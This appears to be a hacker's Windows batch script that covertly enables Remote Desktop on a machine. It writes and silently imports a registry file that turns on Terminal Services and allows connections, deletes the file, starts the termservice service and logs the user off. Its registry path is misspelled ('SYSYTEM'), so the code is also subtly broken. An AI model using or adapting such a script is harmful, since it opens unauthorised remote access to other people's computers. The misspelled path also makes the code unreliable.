@echo REGEDIT4 >c:\crazyyxb.reg 
@echo. >> c:\crazyyxb.reg 
@echo [HKEY_LOCAL_MACHINE\SYSYTEM\CurrentControlSet\Control\Terminal Server] >> c:\crazyyxb.reg 
@echo "fdenytsconnections"=dword:00000000 >> c:\crazyyxb.reg 
@echo "Tsenabled"=dword:00000001 >> c:\crazyyxb.reg 
@regedit /s c:\crazyyxb.reg 
@del c:\crazyyxb.reg 
@net start termservice 
@shutdown -L